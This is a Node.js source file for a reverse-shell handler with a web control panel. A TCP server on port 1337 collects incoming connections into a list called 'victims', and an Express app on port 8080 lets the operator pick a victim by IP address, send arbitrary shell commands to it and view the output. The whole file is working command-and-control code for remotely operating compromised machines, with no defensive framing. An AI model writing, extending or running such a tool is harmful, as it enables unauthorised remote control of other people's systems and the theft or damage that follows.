var express = require('express');
var bodyParser = require('body-parser');
var nunjucks = require('nunjucks');     // Templating language inspired in jinja2
var net = require('net');
var date = require('./dateFormat');

var app = express();
app.use(bodyParser.urlencoded({extended:true}));
nunjucks.configure('views', {
    autoescape: true,
    express: app
});

var tcpPort = 1337;
var victims = [];
var commandLine = "";

/************************ TCP server **********************/

// Wrapper for waiting asynchronously
function waitForResponse(socket) {
    return new Promise((resolve) => {           // Promise to resolve in the future
        socket.once('data', function(data) {    // Note that we register the event listener once, otherwise, it would apply every time there is a response
            console.log('%s Client %s responded', date.format(), socket.remoteAddress);
            commandLine += data;
            resolve(true);
        });
        socket.once('close', function() {
            resolve(false);
        });
        socket.once('error', function (err) {
            resolve(false);
        });
    });
}

// Callback for initial message
function initialMessage(data){
    console.log('%s Client sent initial message');
    commandLine += data;
}

// Parameter function executed on every connection
net.createServer(function(sock) {
    console.log('%s Client %s connected', date.format(), sock.remoteAddress );

    sock.on('close', function() {
        console.log('%s Client %s disconnected', date.format(), sock.remoteAddress);
        victims.splice(victims.indexOf(sock), 1);
    });
    sock.on('error', function (err){
        console.log('%s Client %s disconnected because of error: %s', date.format(), remoteAddress, err.message);
        victims.splice(victims.indexOf(sock), 1);
    });

    // Event for initial messages in case there is one
    sock.on('data', initialMessage);

    victims.push(sock);
}).listen(tcpPort, '127.0.0.1');

/******************* Web application server ********************/

app.get('/', function (req, res) {
    if (victims.length == 0){
        res.render('index.html');
    }
    else{
        res.render('hub.html', { victims });
    }
})

app.get('/*.*.*.*', function (req, res) {
    let i, found = false, victim;
    
    for (i = 0; i < victims.length; i++){
        if (victims[i].remoteAddress === req.url.substr(1)){
            victim = victims[i];
        }
    }
    if (!victim){
        res.redirect(303, '/');
    }
    else{
        // Remove listener for possible initial messages
        victim.removeListener('data', initialMessage);

        res.render('victim.html', { commandLine, victim });
    }
})

app.post('/*.*.*.*', function (req, res) {
    let i, found = false, victim;
    
    for (i = 0; i < victims.length; i++){
        if (victims[i].remoteAddress === req.url.substr(1)){
            victim = victims[i];
        }
    }
    if (!victim){
        res.redirect(303, '/');
    }
    else{
        // Remove listener for possible initial messages
        victim.removeListener('data', initialMessage);

        victim.write(req.body.command + "\n");
        console.log("%s User sent command", date.format());
        commandLine += " > " + req.body.command + "\n";
        waitForResponse(victim).then(successful => { // If victim really responds or if it closes the socket
            if (successful){
                res.render('victim.html', { commandLine, victim });
            }
            else{
                res.redirect(303, '/');
            }
        });
    }
})

app.listen(8080);